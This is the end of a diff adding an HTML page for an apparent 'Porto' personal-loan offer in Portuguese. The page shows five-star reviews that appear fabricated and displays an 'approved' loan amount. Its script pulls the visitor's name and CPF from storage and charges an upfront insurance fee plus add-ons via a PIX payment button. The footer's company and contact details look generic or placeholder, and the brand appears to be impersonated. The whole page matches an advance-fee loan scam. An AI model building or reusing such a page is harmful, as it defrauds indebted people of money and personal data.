+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Meu score era muito baixo e mesmo assim consegui. O valor caiu certinho e consegui pagar minhas dívidas. Muito grata!</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%232563EB'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23BFDBFE'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23BFDBFE'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%2393C5FD'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%2393C5FD'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Lucas Ferreira</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20" style="fill:#D1D5DB;color:#D1D5DB;"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Processo rápido e sem burocracia. Fiz tudo pelo celular em 5 minutos e recebi no mesmo dia. Nota 10.</div>
+        </div>
+
+        <div class="m2-review">
+          <div class="m2-review-top">
+            <img class="m2-review-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%23DB2777'/%3E%3Ccircle cx='40' cy='30' r='14' fill='%23FBCFE8'/%3E%3Cellipse cx='40' cy='68' rx='22' ry='18' fill='%23FBCFE8'/%3E%3Ccircle cx='40' cy='30' r='12' fill='%23F9A8D4'/%3E%3Cellipse cx='40' cy='66' rx='20' ry='16' fill='%23F9A8D4'/%3E%3C/svg%3E" alt="">
+            <div>
+              <div class="m2-review-name">Amanda Santos</div>
+              <div class="m2-review-stars"><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg><svg viewBox="0 0 20 20"><path d="M10 15l-5.878 3.09 1.123-6.545L.489 6.91l6.572-.955L10 0l2.939 5.955 6.572.955-4.756 4.635 1.123 6.545z"/></svg></div>
+            </div>
+          </div>
+          <div class="m2-review-text">Sempre tive medo de pedir empréstimo online mas a Porto me surpreendeu. Atendimento ótimo e o dinheiro caiu rapidinho na minha conta.</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    function formatBRL(n) { return Number(n).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }); }
+
+    function loadUserData() {
+      var nome = localStorage.getItem('nome');
+      if (nome) {
+        var nomes = nome.trim().split(/\s+/);
+        var display = nomes.length > 1 ? nomes[0] + ' ' + nomes[nomes.length - 1] : nomes[0];
+        var el = document.getElementById('leadNome');
+        if (el) el.textContent = display;
+      }
+      var cpf = localStorage.getItem('cpf');
+      if (cpf) {
+        var cl = cpf.replace(/\D/g, '');
+        if (cl.length === 11) {
+          var masked = '***.' + cl.substring(3,6) + '.' + cl.substring(6,9) + '-**';
+          var elCpf = document.getElementById('leadCPF');
+          if (elCpf) elCpf.textContent = masked;
+          var elProto = document.getElementById('protocolNum');
+          if (elProto) elProto.textContent = '#SS-' + cl.slice(-4);
+        }
+      }
+    }
+
+    var qpSeguro = new URLSearchParams(window.location.search).get('seguro_price');
+    var baseSeguro = qpSeguro ? parseFloat(qpSeguro) : parseFloat(localStorage.getItem('selectedSeguroPrice') || '36.84');
+    var addons = { 1: false, 2: false };
+    var addonPrices = { 1: 19, 2: 22 };
+
+    function loadValues() {
+      var qp = new URLSearchParams(window.location.search);
+      var approvedAmount = qp.get('loan_amount') || localStorage.getItem('selectedLoanAmount');
+      var installments = qp.get('selectedInstallments') || localStorage.getItem('selectedInstallments');
+      var monthlyPayment = qp.get('selectedMonthlyPayment') || localStorage.getItem('selectedMonthlyPayment');
+
+      if (approvedAmount) {
+        var amount = parseFloat(approvedAmount);
+        var formatted = formatBRL(amount);
+        var heroEl = document.getElementById('heroAmount');
+        if (heroEl) heroEl.textContent = formatted;
+        document.getElementById('resumoCredito').textContent = formatted;
+      }
+
+      if (installments && monthlyPayment) {
+        document.getElementById('resumoParcelas').textContent = installments + 'x de ' + formatBRL(parseFloat(monthlyPayment));
+      } else if (installments && approvedAmount) {
+        var amt = parseFloat(approvedAmount);
+        var months = parseInt(installments, 10) || 36;
+        var r = 0.0049;
+        var m = (amt * (r * Math.pow(1 + r, months))) / (Math.pow(1 + r, months) - 1);
+        document.getElementById('resumoParcelas').textContent = months + 'x de ' + formatBRL(m);
+      }
+
+      document.getElementById('resumoSeguroPrice').textContent = formatBRL(baseSeguro);
+      document.getElementById('resumoLineSeguro').textContent = formatBRL(baseSeguro);
+
+      updateTotal();
+    }
+
+    function toggleAddon(id, price) {
+      addons[id] = !addons[id];
+      var btn = document.getElementById('addonBtn' + id);
+      var card = document.getElementById('addon' + id);
+      if (addons[id]) {
+        btn.classList.add('added');
+        btn.innerHTML = '<svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path></svg> Remover';
+        card.classList.add('added');
+      } else {
+        btn.classList.remove('added');
+        btn.innerHTML = '<svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 4v16m8-8H4"></path></svg> Adicionar';
+        card.classList.remove('added');
+      }
+      updateTotal();
+    }
+
+    function updateTotal() {
+      var total = baseSeguro;
+      if (addons[1]) total += addonPrices[1];
+      if (addons[2]) total += addonPrices[2];
+      document.getElementById('resumoTotal').textContent = formatBRL(total);
+      var ctaText = document.getElementById('ctaText');
+      if (ctaText) ctaText.textContent = 'GERAR PIX DE ' + formatBRL(total);
+      var pixBoxPrice = document.getElementById('pixBoxPrice');
+      if (pixBoxPrice) pixBoxPrice.textContent = formatBRL(total);
+    }
+
+    function handlePayment() {
+      var name = localStorage.getItem('nome') || '';
+      var cpf = localStorage.getItem('cpf') || '';
+      var tel = localStorage.getItem('telephone') || localStorage.getItem('telefone') || '';
+      var amount = localStorage.getItem('selectedLoanAmount') || '';
+
+      var total = baseSeguro;
+      if (addons[1]) total += addonPrices[1];
+
+      localStorage.setItem('selectedSeguroPrice', baseSeguro.toString());
+      localStorage.setItem('pixTotalAmount', total.toString());
+
+      var params = new URLSearchParams();
+      params.set('name', name);
+      params.set('document', cpf);
+      params.set('telephone', tel);
+      params.set('amount', amount);
+      params.set('seguro_price', baseSeguro.toString());
+      params.set('pix_total', total.toString());
+
+      var extras = ['email','income','salaryDay','occupation','education','utm_source','utm_campaign','utm_medium','utm_content','utm_term','selectedInstallments','selectedMonthlyPayment'];
+      extras.forEach(function(p) {
+        var v = localStorage.getItem(p);
+        if (v) params.set(p, v);
+      });
+
+      if (addons[1]) params.set('bump1', '1');
+
+      // Preserva click IDs (gclid, etc.) p/ não perder atribuição Google/Utmify.
+      // Só adiciona; nunca remove. Busca na URL atual e, como reserva, no que o inicio salvou.
+      (function(){
+        var CIDS = ['gclid','gbraid','wbraid','gad_source','fbclid'];
+        var url = new URLSearchParams(location.search), blob = {};
+        try { blob = JSON.parse(localStorage.getItem('gads_tracking') || localStorage.getItem('gc_pdc') || '{}'); } catch(e){}
+        CIDS.forEach(function(k){
+          var v = url.get(k) || blob[k] || localStorage.getItem(k) || '';
+          if (v) params.set(k, v);
+        });
+      })();
+
+      // Usar sistema de fluxo para próximo passo (Pagamento)
+      setTimeout(() => FLUXO.proximoPasso(), 500);
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      loadUserData();
+      loadValues();
+    });
+  </script>
+
+<!-- FOOTER BOM PRA CRÉDITO -->
+<footer class="ss-footer">
+  <div class="ss-footer-logo"><img src="../images/logo.png" alt="Porto"></div>
+  <p class="ss-footer-company">&copy; 2026 Pagamentos S.A &ndash; Instituição de Pagamento.</p>
+  <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
+  <div class="ss-footer-links">
+    <a onclick="document.getElementById('ss-termos').showModal();return false;">Termos de Uso</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-privacidade').showModal();return false;">Política de Privacidade</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-contato').showModal();return false;">Contato</a>
+  </div>
+  <div class="ss-footer-badges">
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>SSL Seguro</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>Dados protegidos</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/></svg>Instituição regulada</span>
+  </div>
+</footer>
+
+<dialog id="ss-termos" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Termos de Uso</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Aceitação dos Termos</h3>
+    <p>Ao acessar e utilizar os serviços da Porto, você concorda com estes Termos de Uso.</p>
+    <h3>2. Serviços Oferecidos</h3>
+    <p>A Porto é uma instituição financeira digital que oferece serviços de empréstimo pessoal com aprovação rápida e processo 100% online.</p>
+    <h3>3. Elegibilidade</h3>
+    <ul><li>Ser maior de 18 anos</li><li>Possuir CPF válido</li><li>Ter conta bancária ativa em seu nome</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-privacidade" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Política de Privacidade</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Coleta de Dados</h3>
+    <p>A Porto coleta dados pessoais, de contato, financeiros e de navegação.</p>
+    <h3>2. Seus Direitos (LGPD)</h3>
+    <ul><li>Acessar seus dados pessoais</li><li>Corrigir dados incompletos</li><li>Solicitar exclusão de dados</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-contato" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Fale Conosco</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="24" height="24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><div><h4>Email</h4><p>contato@bancoporto.com.br</p></div></div>
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/></svg></div><div><h4>WhatsApp</h4><p>(11) 98765-4321</p></div></div>
+    <div class="ss-contact-note"><p><strong>CNPJ:</strong> 30.680.829/0001-43</p><p><strong>Razão Social:</strong> Banco Porto S.A.</p></div>
+  </div>
+</dialog>
+
+<script>
+document.querySelectorAll(".ss-dialog").forEach(function(d){d.addEventListener("click",function(e){if(e.target===d)d.close();});});
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
